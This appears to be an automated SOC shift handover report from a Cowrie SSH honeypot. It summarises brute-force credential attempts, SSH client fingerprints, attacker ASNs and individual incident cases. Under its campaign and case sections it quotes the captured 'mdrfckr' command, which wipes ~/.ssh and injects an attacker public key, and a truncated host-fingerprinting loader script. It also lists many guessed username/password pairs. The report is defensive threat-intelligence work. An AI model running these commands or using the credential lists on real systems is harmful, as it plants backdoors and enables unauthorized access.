# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-07 |
| **Generated At** | 2026-09-07T22:39:19Z |
| **Shift Time** | 22:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **220** |
| Confirmed Threats | **188** |
| False Positives Filtered | **32** (14.5%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **19** |
| High Severity Cases | **179** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **41** |
| Malware Samples Analyzed | **4** HIGH · **21** MED · 18 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **212** |
| Unique Credential Pairs | **171** |
| Unique Usernames | **70** |
| Unique Passwords | **136** |
| Successful Auth Pairs | **194** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `admin` | 19 |
| `345gs5662d34` | 12 |
| `ubuntu` | 10 |
| `user` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 11 |
| `admin` | 7 |
| `123456` | 6 |
| `ubuntu` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `admin` | `admin` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `support` | `support` | 4 |
| `root` | `123456` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-09-07T18:55:36 |
| `root` | `09N1RCa1Hs31` | `81.169.219.15` | 2026-09-07T18:58:29 |
| `dixi` | `09N1RCa1Hs31` | `81.169.219.15` | 2026-09-07T19:04:50 |
| `ovpn` | `ovpn` | `92.205.57.72` | 2026-09-07T19:07:56 |
| `345gs5662d34` | `345gs5662d34` | `92.205.57.72` | 2026-09-07T19:07:58 |
| `ovpn` | `3245gs5662d34` | `92.205.57.72` | 2026-09-07T19:07:59 |
| `root` | `rootroot` | `81.169.219.15` | 2026-09-07T19:11:02 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-07T19:11:34 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-07T19:14:06 |
| `root` | `stoneage` | `4.157.250.195` | 2026-09-07T19:14:09 |
| `345gs5662d34` | `345gs5662d34` | `4.157.250.195` | 2026-09-07T19:14:10 |
| `root` | `3245gs5662d34` | `4.157.250.195` | 2026-09-07T19:14:10 |
| `root` | `eSER!@#` | `45.78.235.121` | 2026-09-07T19:14:51 |
| `345gs5662d34` | `345gs5662d34` | `45.78.235.121` | 2026-09-07T19:14:55 |
| `root` | `3245gs5662d34` | `45.78.235.121` | 2026-09-07T19:14:57 |
| `root` | `pw1234` | `81.169.219.15` | 2026-09-07T19:17:13 |
| `uucp` | `uucp` | `138.226.239.234` | 2026-09-07T19:18:29 |
| `admin` | `admin` | `160.250.93.239` | 2026-09-07T19:20:17 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-07T19:20:19 |
| `root` | `!123456` | `81.169.219.15` | 2026-09-07T19:23:26 |
| `username` | `password` | `77.90.185.17` | 2026-09-07T19:23:33 |
| `root` | ` ` | `103.146.202.84` | 2026-09-07T19:33:23 |
| `admin` | `Password1` | `182.93.50.90` | 2026-09-07T19:37:15 |
| `345gs5662d34` | `345gs5662d34` | `182.93.50.90` | 2026-09-07T19:37:19 |
| `admin` | `3245gs5662d34` | `182.93.50.90` | 2026-09-07T19:37:20 |
| `user` | `user@2025` | `118.196.119.108` | 2026-09-07T19:39:16 |
| `345gs5662d34` | `345gs5662d34` | `118.196.119.108` | 2026-09-07T19:39:45 |
| `root` | `Test123!` | `217.60.255.130` | 2026-09-07T19:39:53 |
| `root` | `root@2020` | `155.94.233.59` | 2026-09-07T19:41:22 |
| `345gs5662d34` | `345gs5662d34` | `155.94.233.59` | 2026-09-07T19:41:24 |
| `root` | `3245gs5662d34` | `155.94.233.59` | 2026-09-07T19:41:25 |
| `root` | `12345x` | `81.169.219.15` | 2026-09-07T19:42:27 |
| `root` | `root123456789` | `177.30.68.202` | 2026-09-07T19:42:54 |
| `345gs5662d34` | `345gs5662d34` | `177.30.68.202` | 2026-09-07T19:42:56 |
| `root` | `3245gs5662d34` | `177.30.68.202` | 2026-09-07T19:42:57 |
| `ubuntu` | `ubuntu` | `165.232.44.201` | 2026-09-07T19:43:16 |
| `redhat` | `redhat123` | `165.232.44.201` | 2026-09-07T19:43:51 |
| `ubuntu` | `123456` | `165.232.44.201` | 2026-09-07T19:44:23 |
| `solana` | `solana` | `165.232.44.201` | 2026-09-07T19:44:54 |
| `sc` | `123` | `10.0.0.73` | 2026-09-07T19:45:24 |
| `sol` | `sol` | `165.232.44.201` | 2026-09-07T19:45:25 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-07T19:45:28 |
| `sc` | `3245gs5662d34` | `10.0.0.73` | 2026-09-07T19:45:30 |
| `infoserve` | `@info2016!` | `10.0.0.73` | 2026-09-07T19:45:52 |
| `infoserve` | `3245gs5662d34` | `10.0.0.73` | 2026-09-07T19:45:55 |
| `validator` | `validator` | `165.232.44.201` | 2026-09-07T19:45:55 |
| `anvel` | `anvel` | `165.232.44.201` | 2026-09-07T19:46:24 |
| `hadoop` | `hadoop` | `165.232.44.201` | 2026-09-07T19:46:54 |
| `nutanix` | `nutanix/4u` | `165.232.44.201` | 2026-09-07T19:47:23 |
| `oneadmin` | `oneadmin` | `165.232.44.201` | 2026-09-07T19:47:53 |
| `oneadmin` | `opennebula` | `165.232.44.201` | 2026-09-07T19:48:22 |
| `root` | `Pa22word` | `81.169.219.15` | 2026-09-07T19:48:51 |
| `opennebula` | `opennebula` | `165.232.44.201` | 2026-09-07T19:48:51 |
| `ethereum` | `ethereum` | `165.232.44.201` | 2026-09-07T19:49:20 |
| `root` | `password` | `47.236.228.211` | 2026-09-07T19:49:36 |
| `root` | `admin` | `47.236.228.211` | 2026-09-07T19:49:41 |
| `root` | `oracle` | `47.236.228.211` | 2026-09-07T19:49:46 |
| `root` | `Oracle@2024` | `47.236.228.211` | 2026-09-07T19:49:49 |
| `frappe` | `frappe` | `165.232.44.201` | 2026-09-07T19:49:50 |
| `root` | `Oracle123` | `47.236.228.211` | 2026-09-07T19:49:52 |
| `root` | `OracleCloud` | `47.236.228.211` | 2026-09-07T19:49:56 |
| `root` | `oci` | `47.236.228.211` | 2026-09-07T19:49:59 |
| `root` | `opc` | `47.236.228.211` | 2026-09-07T19:50:02 |
| `root` | `qwerty` | `47.236.228.211` | 2026-09-07T19:50:05 |
| `root` | `1q2w3e4r` | `47.236.228.211` | 2026-09-07T19:50:09 |
| `root` | `P@ssw0rd` | `47.236.228.211` | 2026-09-07T19:50:12 |
| `root` | `Changeme123` | `47.236.228.211` | 2026-09-07T19:50:15 |
| `root` | `Welcome1` | `47.236.228.211` | 2026-09-07T19:50:18 |
| `frappe` | `123` | `165.232.44.201` | 2026-09-07T19:50:19 |
| `root` | `ubuntu` | `47.236.228.211` | 2026-09-07T19:50:21 |
| `root` | `Hackers` | `47.236.228.211` | 2026-09-07T19:50:24 |
| `root` | `Contabo123` | `47.236.228.211` | 2026-09-07T19:50:27 |
| `root` | `toor` | `47.236.228.211` | 2026-09-07T19:50:31 |
| `opc` | `password` | `47.236.228.211` | 2026-09-07T19:50:34 |
| `opc` | `oracle` | `47.236.228.211` | 2026-09-07T19:50:38 |
| `opc` | `Oracle@2024` | `47.236.228.211` | 2026-09-07T19:50:42 |
| `ubuntu` | `ubuntu` | `47.236.228.211` | 2026-09-07T19:50:45 |
| `ubuntu` | `oracle` | `47.236.228.211` | 2026-09-07T19:50:48 |
| `tim` | `pass` | `165.232.44.201` | 2026-09-07T19:50:48 |
| `admin` | `admin` | `47.236.228.211` | 2026-09-07T19:50:52 |
| `admin` | `oracle` | `47.236.228.211` | 2026-09-07T19:50:55 |
| `admin` | `Oracle@2024` | `47.236.228.211` | 2026-09-07T19:50:57 |
| `tim` | `password` | `165.232.44.201` | 2026-09-07T19:51:17 |
| `adminadmin` | `adminadmin` | `10.0.0.73` | 2026-09-07T19:51:30 |
| `adminadmin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-07T19:51:32 |
| `git` | `git` | `165.232.44.201` | 2026-09-07T19:51:46 |
| `git` | `git123` | `165.232.44.201` | 2026-09-07T19:52:15 |
| `git` | `git@123` | `165.232.44.201` | 2026-09-07T19:52:44 |
| `erp` | `erp@321` | `165.232.44.201` | 2026-09-07T19:53:13 |
| `erp` | `erp@123` | `165.232.44.201` | 2026-09-07T19:53:43 |
| `erp` | `erp123` | `165.232.44.201` | 2026-09-07T19:54:11 |
| `root` | `123root123` | `210.79.142.201` | 2026-09-07T19:54:17 |
| `345gs5662d34` | `345gs5662d34` | `210.79.142.201` | 2026-09-07T19:54:21 |
| `root` | `3245gs5662d34` | `210.79.142.201` | 2026-09-07T19:54:23 |
| `erp` | `Erp@1234` | `165.232.44.201` | 2026-09-07T19:54:42 |
| `root` | `pa22word` | `81.169.219.15` | 2026-09-07T19:55:17 |
| `tim` | `tim123` | `165.232.44.201` | 2026-09-07T19:55:41 |
| `root` | `Qwer@1234` | `165.232.44.201` | 2026-09-07T19:56:10 |
| `admin` | `Qwer@1234` | `165.232.44.201` | 2026-09-07T19:56:40 |
| `user` | `Qwer@1234` | `165.232.44.201` | 2026-09-07T19:57:09 |
| `root` | `ABCabc@123` | `165.232.44.201` | 2026-09-07T19:57:38 |
| `admin` | `ABCabc@123` | `165.232.44.201` | 2026-09-07T19:58:07 |
| `user` | `ABCabc@123` | `165.232.44.201` | 2026-09-07T19:58:37 |
| `tim` | `tim` | `165.232.44.201` | 2026-09-07T19:59:06 |
| `nabeel` | `nabeel` | `165.232.44.201` | 2026-09-07T19:59:35 |
| `git` | `gitgitgit` | `165.232.44.201` | 2026-09-07T20:00:04 |
| `dspace` | `dspace` | `165.232.44.201` | 2026-09-07T20:00:34 |
| `admin` | `admin` | `165.232.44.201` | 2026-09-07T20:01:32 |
| `ubuntu` | `progres` | `81.169.219.15` | 2026-09-07T20:01:41 |
| `rita` | `rita` | `165.232.44.201` | 2026-09-07T20:02:01 |
| `admin` | `admin123` | `165.232.44.201` | 2026-09-07T20:02:30 |
| `ubuntu` | `root` | `165.232.44.201` | 2026-09-07T20:03:00 |
| `root` | `Ideal123Care` | `165.232.44.201` | 2026-09-07T20:03:29 |
| `oracle` | `oracle123` | `165.232.44.201` | 2026-09-07T20:03:58 |
| `x` | `x` | `165.232.44.201` | 2026-09-07T20:04:27 |
| `share` | `share123` | `165.232.44.201` | 2026-09-07T20:04:56 |
| `onkar` | `onkar123` | `165.232.44.201` | 2026-09-07T20:05:25 |
| `avax` | `avax` | `165.232.44.201` | 2026-09-07T20:06:24 |
| `vyos` | `vyos` | `165.232.44.201` | 2026-09-07T20:06:53 |
| `ubuntu` | `123` | `165.232.44.201` | 2026-09-07T20:07:22 |
| `tester` | `tester` | `165.232.44.201` | 2026-09-07T20:07:51 |
| `root` | `!QAZ@WSX3e` | `81.169.219.15` | 2026-09-07T20:08:00 |
| `testing` | `testing` | `165.232.44.201` | 2026-09-07T20:08:20 |
| `sol` | `sol` | `10.0.0.73` | 2026-09-07T20:08:41 |
| `ubuntu` | `qwer1234` | `165.232.44.201` | 2026-09-07T20:08:50 |
| `solana` | `solana` | `10.0.0.73` | 2026-09-07T20:09:00 |
| `eth` | `eth` | `10.0.0.73` | 2026-09-07T20:09:18 |
| `admin` | `1111` | `165.232.44.201` | 2026-09-07T20:09:19 |
| `support` | `support` | `10.0.0.73` | 2026-09-07T20:09:26 |
| `ethereum` | `ethereum` | `10.0.0.73` | 2026-09-07T20:09:36 |
| `eth` | `eth` | `165.232.44.201` | 2026-09-07T20:09:48 |
| `avax` | `avax` | `10.0.0.73` | 2026-09-07T20:09:52 |
| `avalanche` | `avalanche` | `10.0.0.73` | 2026-09-07T20:10:09 |
| `vpn` | `vpn` | `165.232.44.201` | 2026-09-07T20:10:17 |
| `whee` | `whee321` | `165.232.44.201` | 2026-09-07T20:10:47 |
| `elrond` | `elrond` | `165.232.44.201` | 2026-09-07T20:11:16 |
| `zabbix` | `zabbix` | `165.232.44.201` | 2026-09-07T20:12:14 |
| `root` | `Master@2023` | `165.232.44.201` | 2026-09-07T20:12:43 |
| `tahmid` | `tahmid` | `165.232.44.201` | 2026-09-07T20:13:13 |
| `root` | `Server@123` | `165.232.44.201` | 2026-09-07T20:13:42 |
| `user` | `1` | `165.232.44.201` | 2026-09-07T20:14:11 |
| `root` | `@!qwe123` | `81.169.219.15` | 2026-09-07T20:14:16 |
| `user` | `1234` | `165.232.44.201` | 2026-09-07T20:14:40 |
| `hector` | `hector` | `165.232.44.201` | 2026-09-07T20:15:09 |
| `nano` | `nano` | `165.232.44.201` | 2026-09-07T20:15:38 |
| `test` | `test` | `165.232.44.201` | 2026-09-07T20:16:08 |
| `michael` | `michael` | `165.232.44.201` | 2026-09-07T20:16:37 |
| `osboxes` | `osboxes` | `165.232.44.201` | 2026-09-07T20:17:06 |
| `www` | `www` | `165.232.44.201` | 2026-09-07T20:17:36 |
| `max` | `max123` | `165.232.44.201` | 2026-09-07T20:18:05 |
| `mike` | `mike` | `165.232.44.201` | 2026-09-07T20:18:30 |
| `mike` | `1234` | `165.232.44.201` | 2026-09-07T20:18:55 |
| `mike` | `123` | `165.232.44.201` | 2026-09-07T20:19:21 |
| `mike` | `mike123` | `165.232.44.201` | 2026-09-07T20:19:46 |
| `justin` | `justin` | `165.232.44.201` | 2026-09-07T20:20:11 |
| `root` | `Admin!@#` | `81.169.219.15` | 2026-09-07T20:20:26 |
| `leontyev` | `leontyev` | `165.232.44.201` | 2026-09-07T20:20:37 |
| `panyue` | `panyue` | `165.232.44.201` | 2026-09-07T20:21:02 |
| `user` | `12345678` | `165.232.44.201` | 2026-09-07T20:21:28 |
| `aas` | `ass` | `165.232.44.201` | 2026-09-07T20:21:54 |
| `ethdocker` | `ethdocker` | `165.232.44.201` | 2026-09-07T20:22:19 |
| `solv` | `solv` | `165.232.44.201` | 2026-09-07T20:22:45 |
| `solv` | `solv123` | `165.232.44.201` | 2026-09-07T20:23:11 |
| `solv` | `123456` | `165.232.44.201` | 2026-09-07T20:23:37 |
| `solv` | `12345678` | `165.232.44.201` | 2026-09-07T20:24:02 |
| `saas` | `sass` | `165.232.44.201` | 2026-09-07T20:24:28 |
| `saasuser` | `saasuser` | `165.232.44.201` | 2026-09-07T20:24:53 |
| `saasadmin` | `saasadmin` | `165.232.44.201` | 2026-09-07T20:25:19 |
| `node` | `node` | `165.232.44.201` | 2026-09-07T20:25:44 |
| `pool` | `pool` | `165.232.44.201` | 2026-09-07T20:26:09 |
| `root` | `R00t@123` | `10.0.0.73` | 2026-09-07T20:26:31 |
| `root` | `P@$$W0RD` | `81.169.219.15` | 2026-09-07T20:26:34 |
| `rahul` | `rahul` | `165.232.44.201` | 2026-09-07T20:26:35 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-07T20:26:36 |
| `postgres` | `postgres` | `165.232.44.201` | 2026-09-07T20:27:00 |
| `debian` | `debian` | `165.232.44.201` | 2026-09-07T20:27:25 |
| `root` | `ubuntu` | `122.225.202.130` | 2026-09-07T20:27:39 |
| `ubuntu` | `1q2w3e4r` | `165.232.44.201` | 2026-09-07T20:27:50 |
| `guest` | `q1w2e3r4` | `165.232.44.201` | 2026-09-07T20:28:16 |
| `root` | `q1w2e3r4` | `165.232.44.201` | 2026-09-07T20:28:42 |
| `admin` | `q1w2e3r4` | `165.232.44.201` | 2026-09-07T20:29:07 |
| `user1` | `q1w2e3r4` | `165.232.44.201` | 2026-09-07T20:29:33 |
| `root` | `bloclchain1!` | `165.232.44.201` | 2026-09-07T20:29:59 |
| `root` | `P@$$w0rd` | `81.169.219.15` | 2026-09-07T20:32:49 |
| `root` | `ktfrzdnalG` | `10.0.0.73` | 2026-09-07T20:37:18 |
| `root` | `P@55w0rd` | `81.169.219.15` | 2026-09-07T20:38:59 |
| `root` | `!root` | `193.32.162.84` | 2026-09-07T20:40:15 |
| `root` | `111111` | `193.32.162.84` | 2026-09-07T20:42:35 |
| `root` | `123123` | `193.32.162.84` | 2026-09-07T20:45:00 |
| `root` | `P@55w0rd!` | `81.169.219.15` | 2026-09-07T20:45:13 |
| `root` | `1234` | `193.32.162.84` | 2026-09-07T20:47:17 |
| `root` | `12345` | `193.32.162.84` | 2026-09-07T20:49:32 |
| `root` | `P@55word` | `81.169.219.15` | 2026-09-07T20:51:25 |
| `root` | `12345678` | `193.32.162.84` | 2026-09-07T20:53:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **220** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 135 |
| libssh | 29 |
| Paramiko (Python) | 26 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 101 | 2 |
| `6372ee695756...` | Modern SSH client | 26 | 1 |
| `98f63c4d9c87...` | Generic scanner | 19 | 1 |
| `f555226df196...` | Mirai/variant | 17 | 6 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 101 | 2 | Generic scanner |
| `6372ee695756...` | Paramiko (Python) | 26 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 19 | 1 | Generic scanner |
| `f555226df196...` | libssh | 17 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 6 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `4.157.250.195`, `155.94.233.59`, `210.79.142.201`, `45.78.235.121`, `182.93.50.90`, `177.30.68.202`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch
```
Source IPs: `193.32.162.84`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **22** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 18 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | MEDIUM |
| `AS58563` | CHINANET Hubei province network | 1 | HIGH |
| `AS6805` | Telefonica Germany GmbH & Co.OHG | 1 | LOW |
| `AS9231` | China Mobile Hong Kong Company Limited | 1 | LOW |
| `AS268011` | S.BARROS DE SOUZA-ME | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (162)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-148d022cff77

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-07 18:55 |
| **Last Seen** | 2026-09-07 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 18:55:35` | `cowrie.session.connect` |
| `2026-09-07 18:55:35` | `cowrie.client.version` |
| `2026-09-07 18:55:36` | `cowrie.client.kex` |
| `2026-09-07 18:55:36` | `cowrie.login.success` |
| `2026-09-07 18:55:36` | `cowrie.direct-tcpip.request` |
| `2026-09-07 18:55:36` | `cowrie.direct-tcpip.data` |
| `2026-09-07 18:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c32f1f7eb6

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-09-07 19:07 |
| **Last Seen** | 2026-09-07 19:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:07:56` | `cowrie.session.connect` |
| `2026-09-07 19:07:56` | `cowrie.client.version` |
| `2026-09-07 19:07:56` | `cowrie.client.kex` |
| `2026-09-07 19:07:56` | `cowrie.login.success` |
| `2026-09-07 19:07:57` | `cowrie.session.params` |
| `2026-09-07 19:07:57` | `cowrie.command.input` |
| `2026-09-07 19:07:57` | `cowrie.command.failed` |
| `2026-09-07 19:07:57` | `cowrie.log.closed` |
| `2026-09-07 19:07:58` | `cowrie.session.params` |
| `2026-09-07 19:07:58` | `cowrie.command.input` |
| `2026-09-07 19:07:58` | `cowrie.session.file_download` |
| `2026-09-07 19:07:58` | `cowrie.log.closed` |
| `2026-09-07 19:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9da5af74aa6

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-09-07 19:07 |
| **Last Seen** | 2026-09-07 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:07:58` | `cowrie.session.connect` |
| `2026-09-07 19:07:58` | `cowrie.client.version` |
| `2026-09-07 19:07:58` | `cowrie.client.kex` |
| `2026-09-07 19:07:58` | `cowrie.login.success` |
| `2026-09-07 19:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e43d9deb529c

| Field | Detail |
|---|---|
| **Source IP** | `92.205.57[.]72` |
| **First Seen** | 2026-09-07 19:07 |
| **Last Seen** | 2026-09-07 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:07:59` | `cowrie.session.connect` |
| `2026-09-07 19:07:59` | `cowrie.client.version` |
| `2026-09-07 19:07:59` | `cowrie.client.kex` |
| `2026-09-07 19:07:59` | `cowrie.login.success` |
| `2026-09-07 19:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03004d625a2

| Field | Detail |
|---|---|
| **Source IP** | `4.157.250[.]195` |
| **First Seen** | 2026-09-07 19:14 |
| **Last Seen** | 2026-09-07 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:14:09` | `cowrie.session.connect` |
| `2026-09-07 19:14:09` | `cowrie.client.version` |
| `2026-09-07 19:14:09` | `cowrie.client.kex` |
| `2026-09-07 19:14:09` | `cowrie.login.success` |
| `2026-09-07 19:14:10` | `cowrie.session.params` |
| `2026-09-07 19:14:10` | `cowrie.command.input` |
| `2026-09-07 19:14:10` | `cowrie.command.failed` |
| `2026-09-07 19:14:10` | `cowrie.log.closed` |
| `2026-09-07 19:14:10` | `cowrie.session.params` |
| `2026-09-07 19:14:10` | `cowrie.command.input` |
| `2026-09-07 19:14:10` | `cowrie.session.file_download` |
| `2026-09-07 19:14:10` | `cowrie.log.closed` |
| `2026-09-07 19:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.157.250[.]195` to AbuseIPDB if not already reported
- [ ] Block `4.157.250[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

